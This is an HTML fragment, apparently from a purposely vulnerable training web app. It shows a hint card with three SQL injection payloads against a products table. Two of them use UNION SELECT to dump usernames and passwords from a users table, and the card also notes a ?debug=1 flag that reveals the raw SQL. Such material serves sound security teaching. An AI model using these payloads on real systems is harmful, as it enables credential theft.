        ...
        <div class="card">
            ...
            <div class="card-body">
                ...
                <div class="alert alert-danger p-2">
                    <h6 class="mb-1">🎯 SQL Injection Testing</h6>
                    <p class="mb-1 small">Table <strong>products</strong> has 6 cols:<br>
                        <code style="font-size:.7rem;">id, name, description, price, category, created_at</code>
                    </p>
                    <div class="mb-1">
                        <span class="badge bg-dark mb-1">1. Return all rows</span>
                        <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;">
                            <code>' OR '1'='1'-- -</code>
                        </div>
                        <small class="text-muted">Looks same as default — all products shown</small>
                    </div>
                    <div class="mb-1">
                        <span class="badge bg-dark mb-1">2. Dump credentials</span>
                        <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;">
                            <code>' UNION SELECT 1,username,password,4,5,6 FROM users-- -</code>
                        </div>
                        <small class="text-muted">Shows username/password as product rows</small>
                    </div>
                    <div class="mb-1">
                        <span class="badge bg-dark mb-1">3. Dump only (no products)</span>
                        <div class="bg-light rounded p-1" style="word-break:break-all;font-size:.72rem;">
                            <code>' AND 1=2 UNION SELECT NULL,concat(username,':',password),NULL,NULL,NULL,NULL FROM users-- -</code>
                        </div>
                        <small class="text-muted">Hides real products, shows user:pass only</small>
                    </div>
                    <p class="mb-0 small">💡 Append <code>?debug=1</code> to URL to see raw SQL.</p>
                </div>
            </div>
        </div>
    </div>
